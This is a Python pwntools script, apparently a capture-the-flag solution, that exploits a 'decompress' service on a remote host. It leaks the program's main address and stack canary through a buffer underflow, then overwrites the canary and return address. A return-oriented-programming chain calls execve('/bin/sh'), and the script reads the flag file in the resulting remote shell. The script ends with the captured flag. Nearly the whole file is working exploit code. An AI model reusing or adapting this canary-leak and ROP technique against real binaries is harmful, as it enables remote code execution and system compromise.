"""
Return Oriented Programming (ROP)
"""

from pwn import *

# p = process("./decompress")


# gdb.attach(p)
# input()

# main+136 0x7f68ca17519c
# main     0x7f68ca1751[14] 0x14 <- ostatni byte
main_least_byte = 0x14

# addresses during one runtime gdb exploration
# : pop rax ; ret
pop_rax = 0x00007f68ca1bc797
# : pop rdi ; ret
pop_rdi = 0x00007f68ca174c32
# : pop rsi ; ret
pop_rsi = 0x00007f68ca1826be
# : pop rdx ; ret
pop_rdx = 0x00007f68ca174b3f
# : syscall
syscall = 0x00007f68ca174643

libc_csu_init = 0x7f2cd82db290

main_addr = 0x7f68ca175114

offset = dict()
offset['pop_rax'] = pop_rax - main_addr
offset['pop_rdi'] = pop_rdi - main_addr
offset['pop_rsi'] = pop_rsi - main_addr
offset['pop_rdx'] = pop_rdx - main_addr
offset['syscall'] = syscall - main_addr

offset['libc_csu_init'] = libc_csu_init - 0x7f2cd82da114 # values from different exectuion

# print(offset['syscall'])

remote_addr = 'mim2022.tailcall.net'
easy_port = 30004
hard_port = 30003
p = remote(remote_addr, hard_port)

cmd_read_128 = p16(16) + p16(0)
cmd_read_64 = p16(8) + p16(0)
cmd_0 = p16(0) + p16(0)

b = p.recv(timeout=1)

p.send(p16(1) + p16(0) + p8(main_least_byte)) # write main's least significant byte (same every time)
p.send(p16(7) + p16(5 * 8)) # read <main+136> to the beg of buffer
p.send(p16(8) + p16(264 + 8))
buff_rest = 1024 - 16
p.send(p16(buff_rest) + p16(0) + b'a'*buff_rest) # fill te buffer
p.send(p16(8) + p16(0) + b'a'*8) # fill the gap before canary
p.send(p16(8) + p16(1024 + 264 + 8)) # dist based cmd: rewrite canary and move bufpos to caller_rbp place
p.send(p16(8) + p16(0) + b'a'*8) # replace caller_rbp (libc_csu_init) for now
p.send(p16(8) + p16(8 + 8 + 8 + 1024)) # replace the return address with main's address
p.send(cmd_0) # end first main execution

buf = p.recv(timeout=1)
main_addr_bytes = buf[:8]
canary = buf[8:16]
print("Main addr:", u64(main_addr_bytes))
print("canary: ", canary)

# : pop rax ; ret
pop_rax = u64(main_addr_bytes) + offset['pop_rax']
# : pop rdi ; ret
pop_rdi = u64(main_addr_bytes) + offset['pop_rdi']
# : pop rsi ; ret
pop_rsi = u64(main_addr_bytes) + offset['pop_rsi']
# : pop rdx ; ret
pop_rdx = u64(main_addr_bytes) + offset['pop_rdx']
# : syscall
syscall = u64(main_addr_bytes) + offset['syscall']

libc_csu_init = u64(main_addr_bytes) + offset['libc_csu_init']

# to, że to jest w jednym sendzie, nie ma znaczenia
p.send(
    p16(1) + p16(0) + p8(0xf8) +
    p16(7) + p16(8 + 8) +
    p16(1016) + p16(0) +
    b'/bin/sh\0'* 127 + # 1024
    p16(8) + p16(1024) + # dist based cmd: read 8 bytes from buf beginning 1032
    p16(8) + p16(0) + canary + # dist based cmd: rewrite canary and move bufpos to caller_rbp place 1040
    p16(8) + p16(0) + 
    p64(libc_csu_init) + # 1048
    cmd_read_128 + # len based cmd: read 16 bytes
    p64(pop_rax) +
    p64(0x3b) + # 1064
    cmd_read_64 +
    p64(pop_rdi) + # 1072
    p16(8) + p16(8 + 16 + 8 + 8 + 8 + 1024) + # 1080
    cmd_read_128 + # 1096
    p64(pop_rsi) +    # ret skacze do pop rsi ; ret
    p64(0) +                      # rsi <= 0 (argv = NULL)
    cmd_read_128 + # 1112
    p64(pop_rdx) +    # pop rdx ; ret
    p64(0) +                      # rdx <= 0 (envp = NULL)
    cmd_read_64 + # 1128
    p64(syscall) + # 1132
    cmd_0
)

# works only for remote
buf = p.recvn(1024 + 8 + 8 + 8 + 16 + 8 + 8 + 16 + 16 + 8 + 8 + 8 + 8 + 4) 

p.send( b'cat /home/pwn/flag.txt\n')

p.interactive()

# FLAGA ESSA: BSK{W4s_tH4T_a_bUFf3r_UNd3r_fl0W?}
